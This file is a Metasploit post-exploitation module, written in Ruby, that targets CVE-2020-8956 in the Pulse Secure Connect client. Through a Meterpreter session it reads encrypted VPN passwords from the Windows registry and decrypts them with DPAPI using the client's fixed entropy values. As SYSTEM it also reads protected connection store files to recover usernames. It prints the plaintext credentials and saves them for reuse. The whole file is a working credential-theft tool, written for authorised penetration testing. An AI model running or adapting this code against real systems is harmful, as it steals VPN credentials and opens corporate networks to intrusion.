##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

class MetasploitModule < Msf::Post

  include Msf::Post::Windows::Registry
  include Msf::Post::Windows::UserProfiles
  include Msf::Post::Windows::Priv
  include Msf::Auxiliary::Report

  def initialize(info = {})
    super(
      update_info(
        info,
        'Name' => 'Windows Pulse Secure Connect Client Saved Password Extractor',
        'Description' => %q{
          This module extracts and decrypts saved Pulse Secure Connect Client passwords from the
          Windows Registry. This module can only access credentials created by the user that the
          Meterpreter session is running as.
          Note that this module cannot link the password to a username unless the
          Meterpreter sessions is running as SYSTEM. This is because the username associated
          with a password is saved in 'C:\ProgramData\Pulse Secure\ConnectionStore\[SID].dat',
          which is only readable by SYSTEM.
          Note that for enterprise deployment, this username is almost always the domain
          username.
        },
        'License' => MSF_LICENSE,
        'References' => [
          [ 'CVE', '2020-8956'],
          [ 'URL', 'https://qkaiser.github.io/reversing/2020/10/27/pule-secure-credentials'],
          [ 'URL', 'https://www.gremwell.com/blog/reversing_pulse_secure_client_credentials_store'],
          [ 'URL', 'https://kb.pulsesecure.net/articles/Pulse_Security_Advisories/SA44601' ]
        ],
        'Platform' => ['win'],
        'SessionTypes' => ['meterpreter'],
        'Author' => ['Quentin Kaiser <kaiserquentin[at]gmail.com>'],
        'Compat' => {
          'Meterpreter' => {
            'Commands' => %w[
              stdapi_fs_stat
              stdapi_railgun_api
              stdapi_sys_config_getsid
              stdapi_sys_process_attach
              stdapi_sys_process_get_processes
              stdapi_sys_process_getpid
              stdapi_sys_process_memory_allocate
              stdapi_sys_process_memory_read
              stdapi_sys_process_memory_write
            ]
          }
        },
        'Notes' => {
          'Stability' => [CRASH_SAFE],
          'SideEffects' => [IOC_IN_LOGS],
          'Reliability' => []
        }
      )
    )
  end

  # Decrypts `data` encrypted with Windows DPAPI by calling CryptUnprotectData
  # with `entropy` as pOptionalEntropy value.
  #
  # @param [String] data Encrypted data, pDataIn per crypt32.dll.
  # @param [String] entropy Optional entropy value, pOptionalEntropy per crypt32.dll
  #
  # @return [String] Decrypted value or empty string in case of failure.
  #
  def decrypt_reg(data, entropy)
    begin
      pid = session.sys.process.getpid
      process = session.sys.process.open(pid, PROCESS_ALL_ACCESS)

      # write entropy to memory
      emem = process.memory.allocate(128)
      process.memory.write(emem, entropy)
      # write encrypted data to memory
      mem = process.memory.allocate(128)
      process.memory.write(mem, data)

      #  enumerate all processes to find the one that we're are currently executing as,
      #  and then fetch the architecture attribute of that process by doing ["arch"]
      #  to check if it is an 32bits process or not.
      if session.sys.process.each_process.find { |i| i['pid'] == pid }['arch'] == 'x86'
        addr = [mem].pack('V')
        len = [data.length].pack('V')

        eaddr = [emem].pack('V')
        elen = [entropy.length].pack('V')

        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 8)
        len, addr = ret['pDataOut'].unpack('V2')
      else
        # Convert using rex, basically doing: [mem & 0xffffffff, mem >> 32].pack("VV")
        addr = Rex::Text.pack_int64le(mem)
        len = Rex::Text.pack_int64le(data.length)

        eaddr = Rex::Text.pack_int64le(emem)
        elen = Rex::Text.pack_int64le(entropy.length)

        ret = session.railgun.crypt32.CryptUnprotectData("#{len}#{addr}", 16, "#{elen}#{eaddr}", nil, nil, 0, 16)
        p_data = ret['pDataOut'].unpack('VVVV')
        len = p_data[0] + (p_data[1] << 32)
        addr = p_data[2] + (p_data[3] << 32)
      end
      return '' if len == 0

      return process.memory.read(addr, len)
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end
    return ''
  end

  # Parse IVEs definitions from Pulse Secure Connect client connection store
  # files. Each definition is converted into a Ruby hash holding a connection source,
  # a friendly name, a URI, and an array of credentials. These Ruby hashes are stored
  # into another Ruby hash, indexed by IVE identifiers.
  #
  # @return [hash] A Ruby hash indexed by IVE identifier
  #
  def find_ives
    connstore_paths = [
      'C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.dat',
      'C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.bak',
      'C:\\ProgramData\\Pulse Secure\\ConnectionStore\\connstore.tmp'
    ]
    begin
      ives = {}
      connstore_paths.each do |path|
        next unless session.fs.file.exist?(path)

        connstore_file = begin
          session.fs.file.open(path)
        rescue StandardError
          nil
        end
        next if connstore_file.nil?

        connstore_data = connstore_file.read.to_s
        connstore_file.close
        matches = connstore_data.scan(/ive "([a-z0-9]*)" {.*?connection-source: "([^"]*)".*?friendly-name: "([^"]*)".*?uri: "([^"]*)".*?}/m)
        matches.each do |m|
          ives[m[0]] = {}
          ives[m[0]]['connection-source'] = m[1]
          ives[m[0]]['friendly-name'] = m[2]
          ives[m[0]]['uri'] = m[3]
          ives[m[0]]['creds'] = []
        end
      end
      return ives
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end
  end

  # Pulse Secure Connect client service creates two files for each user that
  # established a VPN connection at some point in time. The filename contains
  # the user SID, with '.dat' or '.bak' as suffix.
  #
  # These files are only readable by SYSTEM and contains connection details
  # for each IVE the user connected with. We use these details to extract
  # the actual username used to establish the VPN connection if the module
  # was run as the SYSTEM user.
  #
  # @return [String, nil] the username used by user linked to `sid` when establishing
  # a connection with IVE `ive_index`, nil if none.
  #
  def get_username(sid, ive_index)
    paths = [
      "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\#{sid}.dat",
      "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\#{sid}.bak",
      "C:\\ProgramData\\Pulse Secure\\ConnectionStore\\#{sid}.tmp",
    ]
    begin
      return unless is_system?

      paths.each do |path|
        next unless session.fs.file.exist?(path)

        connstore_file = begin
          session.fs.file.open(path)
        rescue StandardError
          nil
        end
        next if connstore_file.nil?

        connstore_data = connstore_file.read.to_s
        connstore_file.close

        matches = connstore_data.scan(/userdata "([a-z0-9]*)" {.*?username: "([^"]*)".*?}/m)
        matches.each do |m|
          if m[0] == ive_index
            return m[1]
          end
        end
      end
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end
    return nil
  end

  # Implements IVE index to pOptionalEntropy value like Pulse Secure Connect
  # client does.
  #
  # @return [String] pOptionalEntropy representation of `ive_index`.
  #
  def get_entropy_from_ive_index(ive_index)
    return "IVE:#{ive_index.upcase}"
  end

  def find_creds
    begin
      # If we execute with elevated privileges, we can go through all registry values
      # so we load all profiles. If we run without privileges, we just load our current
      # user profile. We have to do that otherwise we try to access registry values that
      # we are not allwoed to, triggering a 'Profile doesn't exist or cannot be accessed'
      # error.
      if is_system?
        profiles = grab_user_profiles
      else
        profiles = [{ 'SID' => session.sys.config.getsid }]
      end
      creds = []
      # we get connection ives
      ives = find_ives
      # for each user profile, we check for potential connection ive
      profiles.each do |profile|
        key_names = registry_enumkeys("HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data")
        next unless key_names

        key_names.each do |key_name|
          ive_index = key_name[4..] # remove 'ive:'
          # We get the encrypted password value from registry
          reg_path = "HKEY_USERS\\#{profile['SID']}\\Software\\Pulse Secure\\Pulse\\User Data\\ive:#{ive_index}"
          vals = registry_enumvals(reg_path)

          next unless vals

          vals.each do |val|
            data = registry_getvaldata(reg_path, val)
            if is_system? && data.starts_with?("{\x00c\x00a\x00p\x00i\x00}\x00 \x001\x00,")
              # this means data was encrypted by elevated user using LocalSystem scope and fixed
              # pOptionalEntropy value, adjusting parameters
              data = [Rex::Text.to_ascii(data[18..-3])].pack('H*')
              entropy = ['7B4C6492B77164BF81AB80EF044F01CE'].pack('H*')
            else
              # convert IVE index to DPAPI pOptionalEntropy value like PSC does
              entropy = get_entropy_from_ive_index(ive_index).encode('UTF-16LE').bytes.pack('c*')
            end

            if !data.starts_with?("\x01\x00\x00\x00\xD0\x8C\x9D\xDF\x01\x15\xD1\x11\x8Cz\x00\xC0O\xC2\x97\xEB")
              next
            end

            decrypted = decrypt_reg(data, entropy)
            next unless decrypted != ''

            if !ives.key?(ive_index)
              # If the ive_index is not in gathered IVEs, this means it's a leftover from
              # previously installed Pulse Secure Connect client versions.
              #
              # IVE keys of existing connections can get removed from connstore.dat and connstore.tmp
              # when the new version is executed and that the client has more than one defined connection,
              # leading to them not being inserted in the 'ives' array.
              #
              # However, the registry values are not wiped when Pulse Secure Connect is upgraded
              # to a new version (including versions that fix CVE-2020-8956).
              #
              # TL;DR; We can still decrypt the password, but we're missing the URI and friendly
              # name of that connection.
              ives[ive_index] = {}
              ives[ive_index]['connection-source'] = 'user'
              ives[ive_index]['friendly-name'] = 'unknown'
              ives[ive_index]['uri'] = 'unknown'
              ives[ive_index]['creds'] = []
            end
            ives[ive_index]['creds'].append(
              {
                'username' => get_username(profile['SID'], ive_index),
                'password' => decrypted.remove("\x00")
              }
            )
            creds << ives[ive_index]
          end
        end
      end
      return creds
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end
    return []
  end

  def gather_creds
    print_status('Running credentials acquisition.')
    ives = find_creds
    if ives.empty?
      print_status('No credentials were found.')
    end
    return unless ives.any?

    ives.each do |ive|
      ive['creds'].each do |creds|
        print_good('Account found')
        print_status("     Username: #{creds['username']}")
        print_status("     Password: #{creds['password']}")
        print_status("     URI: #{ive['uri']}")
        print_status("     Name: #{ive['friendly-name']}")
        print_status("     Source: #{ive['connection-source']}")

        uri = URI(ive['uri'])
        begin
          address = Rex::Socket.getaddress(uri.host)
        rescue SocketError
          # if we can't resolve the host, we don't save it to service data
          # in order not to fill it with blank entries
          next
        end
        service_data = {
          address: address,
          port: uri.port,
          protocol: 'tcp',
          realm_key: Metasploit::Model::Realm::Key::WILDCARD,
          realm_value: uri.path.blank? ? '/' : uri.path,
          service_name: 'Pulse Secure SSL VPN',
          workspace_id: myworkspace_id
        }

        credential_data = {
          origin_type: :session,
          session_id: session_db_id,
          post_reference_name: refname,
          username: creds['username'],
          private_data: creds['password'],
          private_type: :password
        }

        credential_core = create_credential(credential_data.merge(service_data))

        login_data = {
          core: credential_core,
          access_level: 'User',
          status: Metasploit::Model::Login::Status::UNTRIED
        }

        create_credential_login(login_data.merge(service_data))
      end
    end
  end

  # Array of vulnerable builds branches.
  def vuln_builds
    [
      [Rex::Version.new('0.0.0'), Rex::Version.new('9.0.5')],
      [Rex::Version.new('9.1.0'), Rex::Version.new('9.1.4')],
    ]
  end

  # Check vulnerable state by parsing the build information from
  # Pulse Connect Secure client version file.
  #
  # @return [Msf::Exploit::CheckCode] host vulnerable state
  #
  def check
    version_path = 'C:\\Program Files (x86)\\Pulse Secure\\Pulse\\versionInfo.ini'
    begin
      if !session.fs.file.exist?(version_path)
        print_error('Pulse Secure Connect client is not installed on this system')
        return Msf::Exploit::CheckCode::Safe
      end
      version_file = begin
        session.fs.file.open(version_path)
      rescue StandardError
        nil
      end
      if version_file.nil?
        print_error('Cannot open Pulse Secure Connect version file.')
        return Msf::Exploit::CheckCode::Unknown
      end
      version_data = version_file.read.to_s
      version_file.close
      matches = version_data.scan(/DisplayVersion=([0-9.]+)/m)
      build = Rex::Version.new(matches[0][0])
      print_status("Target is running Pulse Secure Connect build #{build}.")
      if vuln_builds.any? { |build_range| Rex::Version.new(build).between?(*build_range) }
        print_good('This version is considered vulnerable.')
        return Msf::Exploit::CheckCode::Vulnerable
      end

      if is_system?
        print_good("You're executing from a privileged process so this version is considered vulnerable.")
        return Msf::Exploit::CheckCode::Vulnerable
      end

      print_warning("You're executing from an unprivileged process so this version is considered safe.")
      print_warning('However, there might be leftovers from previous versions in the registry.')
      print_warning('We recommend running this script in elevated mode to obtain credentials saved by recent versions.')
      return Msf::Exploit::CheckCode::Appears
    rescue Rex::Post::Meterpreter::RequestError => e
      vprint_error(e.message)
    end
  end

  def run
    check_code = check
    if check_code == Msf::Exploit::CheckCode::Vulnerable || check_code == Msf::Exploit::CheckCode::Appears
      gather_creds
    end
  end
end
